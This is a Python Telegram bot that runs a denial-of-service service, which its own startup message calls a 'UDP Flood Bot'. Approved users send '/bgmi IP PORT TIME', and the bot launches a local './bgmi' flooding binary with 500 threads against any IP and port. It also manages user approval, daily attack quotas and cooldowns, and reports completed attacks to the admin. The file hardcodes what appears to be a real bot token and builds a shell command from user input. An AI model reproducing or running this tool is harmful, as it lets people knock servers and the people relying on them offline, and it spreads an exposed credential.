import os
import telebot
import logging
import subprocess
import threading
import time
import json
from datetime import datetime, timedelta

# Setup
logging.basicConfig(level=logging.INFO)
TOKEN = '8699345560:AAEId4DfullLQZbW9hRFVIjLkI4xCG1fNXc'
ADMIN_IDS = [1917682089]  # Your admin ID

bot = telebot.TeleBot(TOKEN)

# Global variables
user_attacks = {}
user_cooldowns = {}
active_attacks = 0

# ============================================
# APPROVAL SYSTEM - NEW FEATURE ✅
# ============================================
APPROVED_USERS_FILE = "approved_users.json"

# Load approved users from file
def load_approved_users():
    try:
        with open(APPROVED_USERS_FILE, 'r') as f:
            return set(json.load(f))
    except FileNotFoundError:
        return set()

# Save approved users to file
def save_approved_users():
    with open(APPROVED_USERS_FILE, 'w') as f:
        json.dump(list(APPROVED_USERS), f)

APPROVED_USERS = load_approved_users()

# Check if user is approved
def is_approved(user_id):
    return user_id in ADMIN_IDS or user_id in APPROVED_USERS

# Add user to approval list
def approve_user(user_id):
    APPROVED_USERS.add(user_id)
    save_approved_users()

# Remove user from approval list
def remove_user(user_id):
    APPROVED_USERS.discard(user_id)
    save_approved_users()

# ============================================
# CONFIGURATION
# ============================================
THREAD_COUNT = 500
COOLDOWN_DURATION = 30
DAILY_ATTACK_LIMIT = 50
MAX_ACTIVE_ATTACKS = 3

def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# ============================================
# COMMANDS
# ============================================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    if is_approved(user_id):
        status = "✅ APPROVED"
    else:
        status = "⏳ PENDING APPROVAL"
    
    bot.reply_to(
        message,
        f"🚀 *Welcome @{username}!*\n\n"
        f"📊 *Your Status:* {status}\n\n"
        f"📌 *Commands:*\n"
        f"/bgmi IP PORT TIME - Start attack (Approved users only)\n"
        f"/status - Check your limits\n"
        f"/approve_list - List approved users (Admin only)\n"
        f"/approve <user_id> - Approve a user (Admin only)\n"
        f"/remove <user_id> - Remove user approval (Admin only)\n"
        f"/reset_TF - Reset all limits (Admin only)",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    if not is_approved(user_id):
        bot.reply_to(
            message,
            f"❌ *Access Denied @{username}!*\n\nYou are not approved to use this bot.\nContact admin for approval.",
            parse_mode="Markdown"
        )
        return
    
    remaining = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
    
    cooldown_remaining = 0
    if user_id in user_cooldowns:
        cooldown_end = user_cooldowns[user_id]
        if datetime.now() < cooldown_end:
            cooldown_remaining = int((cooldown_end - datetime.now()).seconds)
    
    status_msg = (
        f"🛡️ *Attack Status*\n"
        f"👤 User: @{username}\n"
        f"✅ Approved: Yes\n"
        f"🎯 Remaining Today: {remaining}/{DAILY_ATTACK_LIMIT}\n"
        f"⏳ Cooldown: {cooldown_remaining}s\n"
        f"🧵 Threads per attack: {THREAD_COUNT}\n"
        f"⚡ Active Attacks: {active_attacks}/{MAX_ACTIVE_ATTACKS}"
    )
    bot.reply_to(message, status_msg, parse_mode="Markdown")

@bot.message_handler(commands=['approve_list'])
def approve_list(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        username = message.from_user.username or message.from_user.first_name
        bot.reply_to(message, f"❌ *Access Denied @{username}!*\nAdmin only command.", parse_mode="Markdown")
        return
    
    if not APPROVED_USERS:
        bot.reply_to(message, "📋 *Approved Users List*\n\nNo approved users yet.", parse_mode="Markdown")
        return
    
    user_list = "\n".join([f"• `{uid}`" for uid in APPROVED_USERS])
    bot.reply_to(
        message,
        f"📋 *Approved Users List*\n\n{user_list}\n\nTotal: {len(APPROVED_USERS)} users",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['approve'])
def approve_user_command(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        username = message.from_user.username or message.from_user.first_name
        bot.reply_to(message, f"❌ *Access Denied @{username}!*\nAdmin only command.", parse_mode="Markdown")
        return
    
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "❌ *Usage:* `/approve <user_id>`", parse_mode="Markdown")
            return
        
        target_id = int(args[1])
        approve_user(target_id)
        
        bot.reply_to(
            message,
            f"✅ *User Approved!*\n\nUser ID: `{target_id}`\nNow they can use /bgmi command.",
            parse_mode="Markdown"
        )
    except ValueError:
        bot.reply_to(message, "❌ *Invalid User ID!*", parse_mode="Markdown")

@bot.message_handler(commands=['remove'])
def remove_user_command(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        username = message.from_user.username or message.from_user.first_name
        bot.reply_to(message, f"❌ *Access Denied @{username}!*\nAdmin only command.", parse_mode="Markdown")
        return
    
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "❌ *Usage:* `/remove <user_id>`", parse_mode="Markdown")
            return
        
        target_id = int(args[1])
        
        if target_id in ADMIN_IDS:
            bot.reply_to(message, "❌ *Cannot remove admin!*", parse_mode="Markdown")
            return
        
        remove_user(target_id)
        
        bot.reply_to(
            message,
            f"❌ *User Removed!*\n\nUser ID: `{target_id}`\nApproval revoked.",
            parse_mode="Markdown"
        )
    except ValueError:
        bot.reply_to(message, "❌ *Invalid User ID!*", parse_mode="Markdown")

@bot.message_handler(commands=['reset_TF'])
def reset_attack_limit(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        username = message.from_user.username or message.from_user.first_name
        bot.reply_to(message, f"❌ *Access Denied @{username}!*", parse_mode="Markdown")
        return
    
    user_attacks.clear()
    user_cooldowns.clear()
    bot.reply_to(message, "🔄 *All attack limits have been reset by ADMIN!*", parse_mode="Markdown")

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global active_attacks
    
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    # ============================================
    # APPROVAL CHECK - MAIN GATE ✅
    # ============================================
    if not is_approved(user_id):
        bot.reply_to(
            message,
            f"❌ *Access Denied @{username}!*\n\n"
            f"You are not approved to use this bot.\n\n"
            f"📌 Contact admin: `/owner`",
            parse_mode="Markdown"
        )
        return
    
    # Check if user is in cooldown
    if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
        remaining = int((user_cooldowns[user_id] - datetime.now()).seconds)
        bot.reply_to(
            message,
            f"⏰ *Cooldown @{username}!*\nPlease wait {remaining} seconds.",
            parse_mode="Markdown"
        )
        return
    
    # Check daily limit
    if user_attacks.get(user_id, 0) >= DAILY_ATTACK_LIMIT:
        bot.reply_to(
            message,
            f"❌ *Daily limit reached @{username}!*\nLimit: {DAILY_ATTACK_LIMIT} attacks/day",
            parse_mode="Markdown"
        )
        return
    
    # Check active attacks limit
    if active_attacks >= MAX_ACTIVE_ATTACKS:
        bot.reply_to(
            message,
            f"⏳ *Please wait @{username}!*\n{MAX_ACTIVE_ATTACKS} attacks already running.",
            parse_mode="Markdown"
        )
        return
    
    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(
                message,
                f"❌ *Usage:* `/bgmi IP PORT TIME`\n"
                f"📌 *Example:* `/bgmi 1.1.1.1 80 60`\n\n"
                f"💡 *Note:* Threads are fixed at {THREAD_COUNT}",
                parse_mode="Markdown"
            )
            return
        
        ip, port, time_val = args
        
        # Validation
        if not is_valid_ip(ip):
            bot.reply_to(message, f"❌ *Invalid IP address @{username}!*", parse_mode="Markdown")
            return
        
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            bot.reply_to(message, f"❌ *Invalid port @{username}!* (1-65535)", parse_mode="Markdown")
            return
        
        if not time_val.isdigit() or int(time_val) < 1 or int(time_val) > 300:
            bot.reply_to(message, f"❌ *Invalid time @{username}!* (1-300 seconds)", parse_mode="Markdown")
            return
        
        # Update user stats
        user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
        active_attacks += 1
        
        remaining = DAILY_ATTACK_LIMIT - user_attacks[user_id]
        
        # Confirm attack start
        bot.reply_to(
            message,
            f"🚀 *Attack Started!*\n"
            f"👤 User: @{username} ✅\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"⏰ Duration: {time_val}s\n"
            f"🧵 Threads: {THREAD_COUNT}\n"
            f"🎯 Remaining Today: {remaining}/{DAILY_ATTACK_LIMIT}",
            parse_mode="Markdown"
        )
        
        # Start attack in background thread
        attack_thread = threading.Thread(
            target=execute_attack,
            args=(ip, int(port), int(time_val), username, user_id)
        )
        attack_thread.daemon = True
        attack_thread.start()
        
    except Exception as e:
        active_attacks = max(0, active_attacks - 1)
        bot.reply_to(message, f"❌ *Error: {str(e)}*", parse_mode="Markdown")

@bot.message_handler(commands=['owner'])
def owner_command(message):
    bot.reply_to(
        message,
        f"👑 *Bot Owner*\n\n"
        f"For approval or support, contact:\n"
        f"Admin ID: `{ADMIN_IDS[0]}`\n\n"
        f"Send your User ID to get approved.",
        parse_mode="Markdown"
    )

def execute_attack(ip, port, duration, username, user_id):
    global active_attacks
    
    try:
        cmd = f"./bgmi {ip} {port} {duration} {THREAD_COUNT}"
        logging.info(f"Executing: {cmd}")
        
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        stdout, stderr = process.communicate(timeout=duration + 10)
        
        bot.send_message(
            ADMIN_IDS[0],
            f"✅ *Attack Completed*\n"
            f"🎯 Target: {ip}:{port}\n"
            f"👤 By: @{username}\n"
            f"⏰ Duration: {duration}s\n"
            f"🧵 Threads: {THREAD_COUNT}",
            parse_mode="Markdown"
        )
        
    except subprocess.TimeoutExpired:
        process.kill()
        bot.send_message(
            ADMIN_IDS[0],
            f"⚠️ *Attack Timeout*\n🎯 Target: {ip}:{port}\n👤 By: @{username}",
            parse_mode="Markdown"
        )
    except Exception as e:
        bot.send_message(
            ADMIN_IDS[0],
            f"❌ *Attack Failed*\n👤 User: @{username}\nError: {str(e)}",
            parse_mode="Markdown"
        )
    finally:
        active_attacks = max(0, active_attacks - 1)

if __name__ == "__main__":
    print("🤖 UDP Flood Bot Starting...")
    print(f"📊 Config: {THREAD_COUNT} threads | {MAX_ACTIVE_ATTACKS} max attacks")
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"✅ Approved Users: {len(APPROVED_USERS)}")
    print("✅ Bot is running...")
    bot.infinity_polling()